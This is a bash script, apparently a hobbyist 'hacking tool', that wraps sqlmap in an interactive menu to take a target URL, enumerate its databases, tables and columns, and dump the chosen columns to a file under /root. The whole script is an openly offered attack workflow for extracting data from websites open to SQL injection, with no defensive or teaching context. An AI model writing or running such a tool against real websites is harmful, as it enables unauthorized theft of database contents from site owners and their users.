#!/bin/bash
#some script are copy from various source....

#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return

function dash_calc(){

	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}


function sqlmap_menu(){
file2="/root/sqltemp2"
file3="/root/sqltemp3"
file4="/root/sqltemp34"
while true
do
	clear
	banner
	dash_calc
	echo -e "\033[0;38m     "
	printf '\033]2;3RSQL\a'
	if [[ "$URL" = "" ]]
	then
		URL=""$RS"None"$CE""
		urls=0
	fi
	if [[ "$FDBS" = "" ]]
	then
		FDBS=""$RS"None"$CE""
		fdbss=0
	fi
	if [[ "$SD" = "" ]]
	then
		SD=""$RS"None"$CE""
		sds=0
	fi
	if [[ "$TB" = "" ]]
	then
		TB=""$RS"None"$CE""
		tbs=0
	fi
	if [[ "$ST" = "" ]]
	then
		ST=""$RS"None"$CE""
		sts=0
	fi
	if [[ "$CL" = "" ]]
	then
		CL=""$RS"None"$CE""
		cls=0
	fi
	if [[ "$SC" = "" ]]
	then
		SC=""$RS"None"$CE""
		scs=0
	fi
	echo -e ""$YS" 1"$CE") URL                         added:"$YS"$URL"$CE""
	if [[ "$urls" = 0 ]]
	then
		echo -e ""$RS" 2"$CE") find databases             added:$FDBS"
	else
		echo -e ""$YS" 2"$CE") find databases             added:$FDBS"
	fi
	if [[ "$fdbss" = 0 ]]
	then
		echo -e ""$RS" 3"$CE") Select database             added:"$YS"$SD"$CE""
	else
		echo -e ""$YS" 3"$CE") Select database             added:"$YS"$SD"$CE""
	fi
	if [[ "$sds" = 0 ]]
	then
		echo -e ""$RS" 4"$CE") find tables                added:"$YS"$TB"$CE""
	else
		echo -e ""$YS" 4"$CE") find tables                added:"$YS"$TB"$CE""
	fi
	if [[ "$tbs" = 0 ]]
	then
		echo -e ""$RS" 5"$CE") Select table                added:"$YS"$ST"$CE""
	else
		echo -e ""$YS" 5"$CE") Select table                added:"$YS"$ST"$CE""
	fi
	if [[ "$sts" = 0 ]]
	then
		echo -e ""$RS" 6"$CE") find columns               added:"$YS"$CL"$CE""
	else
		echo -e ""$YS" 6"$CE") find columns               added:"$YS"$CL"$CE""
	fi
	if [[ "$cls" = 0 ]]
	then
		echo -e ""$RS" 7"$CE") Select columns              added:"$YS"$SC"$CE""
	else
		echo -e ""$YS" 7"$CE") Select columns              added:"$YS"$SC"$CE""
	fi
	if [[ "$scs" = 0 ]]
	then
		echo -e ""$RS" s"$CE") Start"
	else
		echo -e ""$YS" s"$CE") Start"
	fi
	echo -e ""$YS" b"$CE") exit"
	echo -e "\033[0;31m [!]3rr0r-404~# "
	echo -e "\033[0;29m  "
	read SQ
	clear
	if [[ "$SQ" = 1 ]]
	then
		echo -n "URL: "
		read URLL
		if [[ "$URLL" != "" || "$URLL" = "b" ]]
		then
			URL="$URLL"
			urls=1
				##Clearing nexts
				FDBS=""
				fdbss=0
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = "s" ]]
	then
		if [[ "$scs" = 0 ]]
		then
			echo -e ""$RS"No columns selected"$CE""
			sleep 2
			break
		fi
		#~ export URL
		#~ export SD
		#~ export ST
		#~ export SC
		sqlmap -u "$URL" -D "$SD" -T "$ST" -C "$SC" --dump | tee "$file4"
		echo -e ""
		echo -e ""$YS"A log file has been created on "$file4". Copy it before it gets overwritten"$CE""
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
	elif [[ "$SQ" = "b" ]]
	then
		break
	elif [[ "$SQ" = 00 ]]
	then
		exec bash $0
	elif [[ "$SQ" = 7 ]]
	then
		if [[ "$cls" = 0 ]]
		then
			echo -e ""$RS"Columns not added"$CE""
			sleep 2
			break
		fi
		n10=1
		CCO1="$CO1"
		while [[ "$n10" -le "$NCO" ]]
		do
			cl[$n10]=$(cat "$file3" | awk -v n12="$CCO1" '{if(NR==n12)print}' | cut -d ' ' -f2)
			CCO1=$((CCO1+1))
			n10=$((n10+1))
		done
		while true
		do
			clear
			echo -e ""$BS"Columns: "$CE""
			v=1
			while [[ "$v" -le "$NCO" ]]
			do
				if [[ "${selc[$v]}" = 1 ]]
				then
					SSC="$YS"
				else
					SSC="$WS"
				fi
				if [[ "$v" -le 9 ]]
				then
					echo -e ""$YS"  $v"$CE") "$SSC"${cl[$v]}"$CE""
				elif [[ "$v" -le 99 ]]
				then
					echo -e ""$YS" $v"$CE") "$SSC"${cl[$v]}"$CE""
				else
					echo -e ""$YS"$v"$CE") "$SSC"${cl[$v]}"$CE""
				fi
				v=$((v+1))
			done
			echo -e ""$YS" d"$CE") Deselect all"
			echo -e ""$YS" s"$CE") Save selection"
			echo -e ""$YS" b"$CE") Go back"
			echo -e "\033[0;31m [!]3rr0r-404~# "
			echo -e "\033[0;29m  "
			read COCH
			clear
			if [[ "$COCH" = "b" || "$COCH" = "back" ]]
			then
				break
			elif [[ "$COCH" = "s" ]] 
			then
				v2=1
				SC=""
				while [[ "$v2" -le "$NCO" ]]
				do
					if [[ "${selc[$v2]}" = 1 ]]
					then
						if [[ "$SC" = "" ]]
						then
							SC="${cl[$v2]}"
						else
							SC=""$SC","${cl[$v2]}""
						fi
					fi
					v2=$((v2+1))
				done
				if [[ "$SC" = "" ]]
				then
					echo -e ""$RS"Nothing selected"$CE""
					ssc=0
					sleep 2
				else
					ssc=1
				fi
				break
			elif [[ "$COCH" = "d" ]] 
			then
				v1=1
				while [[ "$v1" -le "$NCO" ]]
				do
					selc[$v1]=""
					v1=$((v1+1))
				done
			elif [[ "$COCH" -le 0 || "$COCH" -gt "$NCO" ]] 
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
				continue
			else
				if [[ "${selc[$COCH]}" != 1 ]]
				then
					selc[$COCH]=1
				else
					selc[$COCH]=""
				fi
			fi
		done
	elif [[ "$SQ" = 6 ]]
	then
		while true
		do
			if [[ "$sts" = 0 ]]
			then
				echo -e ""$RS"Table not selected"$CE""
				sleep 2
				break
			fi
			sqlmap -u "$URL" -D "$SD" -T "$ST" --columns <<< $'\n\n\n\n\n\n\n\n\n\n' | tee $file3
			##finding columns
			CO=$(cat "$file3" | awk '{if(/+----/)print NR}')
			CO1=$(echo $CO | cut -d ' ' -f2)
			CO1=$((CO1+1))
			CO2=$(echo $CO | cut -d ' ' -f3)
			CO2=$((CO2-1))
			NCO=$((CO2-CO1))
			if [[ "$NCO" -le 0 ]]
			then
				echo -e ""$RS"Error 24. No columns found automatically"$CE""
				sleep 2
				cls=0
				continue
			else
				if [[ "$NCO" = 1 ]]
				then
					echo -e ""$YS"1 column found!"$CE""
					sleep 2
				else
					echo -e ""$YS""$NCO" columns found!"$CE""
					sleep 2
				fi
				CL="Done"
				cls=1
				break
			fi
		done
	elif [[ "$SQ" = 5 ]]
	then
		while true
		do
			if [[ "$tbs" = 0 ]]
			then
				echo -e ""$RS"Tables not added"$CE""
				sleep 2
				break
			fi
			echo -e ""$BS"Tables: "$CE""
			n9=1
			CC1="$C1"
			while [[ "$n9" -le "$NTB" ]]
			do
				tb[$n9]=$(cat "$file2" | awk -v n11="$CC1" '{if(NR==n11)print}' | cut -d ' ' -f2)
				if [[ "$n9" -le 9 ]]
				then
					echo -e ""$YS"  $n9"$CE") ${tb[$n9]}"
				elif [[ "$n9" -le 99 ]]
				then
					echo -e ""$YS" $n9"$CE") ${tb[$n9]}"
				else
					echo -e ""$YS"$n9"$CE") ${tb[$n9]}"
				fi
				CC1=$((CC1+1))
				n9=$((n9+1))
			done
			echo -e ""$YS" b"$CE") Go back"
			echo -e "\033[0;31m [!]3rr0r-404~# "
			echo -e "\033[0;29m  "

			read TCH
			if [[ "$TCH" = "b" || "$TCH" = "back" ]]
			then
				break
			elif [[ "$TCH" -le 0 || "$TCH" -gt "$NTB" ]] 
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
				continue
			else
				ST="${tb[$TCH]}"
				sts=1
				##Clearing nexts
				cls=0
				CL=""
				scs=0
				SC=""
				break
			fi
		done
	elif [[ "$SQ" = 4 ]]
	then
		if [[ "$sds" = 0 ]]
		then
			echo -e ""$RS"Databases not selected"$CE""
			sleep 2
			continue
		fi
		sqlmap -u "$URL" -D "$SD" --tables <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file2"
		##finding tables
		C=$(cat "$file2" | awk '{if(/+----/)print NR}')
		C1=$(echo $C | cut -d ' ' -f1)
		C1=$((C1+1))
		C2=$(echo $C | cut -d ' ' -f2)
		C2=$((C2-1))
		NTB=$((C2-C1))
		if [[ "$NTB" -le 0 ]]
		then
			echo -e ""$RS"Error 23. No tables found automatically"$CE""
			sleep 2
			tbs=0
			continue
		else
			if [[ "$NTB" = 1 ]]
			then
				echo -e ""$YS"1 table found!"$CE""
				sleep 2
			else
				echo -e ""$YS""$NTB" tables found!"$CE""
				sleep 2
			fi
			TB="Done"
			tbs=1
				##Clearing nexts
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
		fi
	elif [[ "$SQ" = 3 ]]
	then
		while true
		do
			if [[ "$fdbss" = 0 ]]
			then
				echo -e ""$RS"Databases not added"$CE""
				sleep 2
				continue
			fi
			echo -e ""$BS"Databases: "$CE""
			n8=1
			while [[ "$n8" -le "$NDB" ]]
			do
				if [[ "$n8" -le 9 ]]
				then
					echo -e ""$YS"  "$n8""$CE") ${db[$n8]}"
				elif [[ "$n8" -le 99 ]]
				then
					echo -e ""$YS" "$n8""$CE") ${db[$n8]}"
				else
					echo -e ""$YS""$n8""$CE") ${db[$n8]}"
				fi
				n8=$((n8+1))
			done
			echo -e ""$YS" b"$CE") Go back"
			echo -e "\033[0;31m [!]3rr0r-404~# "
			echo -e "\033[0;29m   "

			read DCH
			clear
			if [[ "$DCH" = "b" || "$DCH" = "back" ]]
			then
				break
			fi
			if [[ "$DCH" -lt 0 || "$DCH" -gt "$NDB" ]]
			then
				echo -e ""$RS"Wrong choice"$CE""
				sleep 2
			else
				SD="${db[$DCH]}"
				sds=1
					##Clearing nexts
					TB=""
					tbs=0
					ST=""
					sts=0
					cls=0
					CL=""
					scs=0
					SC=""
				break
			fi	
		done
	elif [[ "$SQ" = 2 ]]
	then
		if [[ "$urls" != 1 ]]
		then
			echo -e ""$RS"URL not selected"$CE""
			sleep 2
			continue
		fi
		file="/root/lscript/sqltemp"
		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
		##Find the line
		CHECK=$(cat "$file" | grep "available databases ")
		if [[ "$CHECK" = "" ]]
		then
			fdbss=0
			echo -e ""$RS"No databases found or not vulnerable website"$CE""
			fdbss=0
			echo -e "$PAKTGB"
			$READAK
			continue
		fi
		LINED=$(cat "$file" | awk '{if(/available databases /)print NR}')
		LINED=$((LINED+1))
		##list databases
		n=0
		echo -e ""BS"Calculating..."$CE""
		while true
		do
			CH=$(cat "$file" | awk -v n7="$LINED" '{if(NR==n7)print}')
			if [[ "$CH" = "" ]]
			then
				break
			else
				##how many dbs found
				n=$((n+1))
				##next line
				LINED=$((LINED+1))
			fi
			CHH=$(echo "$CH" | awk -F "] " {'print $2'})
			if [[ "$CHH" = "" ]]
			then
				echo -e ""$RS"Error 21"$CE""
				CHH=""$RS"Error"$CE""
				sleep 3
			fi
			db[$n]="$CHH"
		done
		sleep 1
		if [[ "$n" = 0 ]]
		then
			echo -e ""$RS"Error 22 No databases found automatically"$CE""
			echo -e "$PAKTGB"
			$READAK
			continue
		elif [[ "$n" = 1 ]]
		then
			echo -e ""$YS"1 database found!"$CE""
			sleep 1
		else
			echo -e ""$YS"$n databases found!"$CE""
			sleep 1
		fi
		echo -e ""
		FDBS=""$YS"Done"$CE""
		fdbss=1
		NDB="$n"
				##Clearing nexts
				SD=""
				sds=0
				TB=""
				tbs=0
				ST=""
				sts=0
				cls=0
				CL=""
				scs=0
				SC=""
	fi	
done
}


clear


function banner(){
 echo -e "\033[0;35m
 _____   ____     ___    _     
| ____| / ___|   / _ \  | |    
|  _|   \___ \  | | | | | |    
| |___   ___) | | |_| | | |___ 
|_____| |____/   \__\_\ |_____|
                                                                          "      
 echo -e "                             \033[0;36m   3rr0r-404"

  echo -e "\033[0;31m   "
}


function banner2(){
   echo -e "\033[0;35m

 _____                  ___                   _  _      ___    _  _                                                                                                   
|___ /   _ __   _ __   / _ \   _ __          | || |    / _ \  | || |  
  |_ \  | '__| | '__| | | | | | '__|  _____  | || |_  | | | | | || |_ 
 ___) | | |    | |    | |_| | | |    |_____| |__   _| | |_| | |__   _|
|____/  |_|    |_|     \___/  |_|               |_|    \___/     |_|  
                                                                      
"
}
banner2

sleep 2
sqlmap_menu
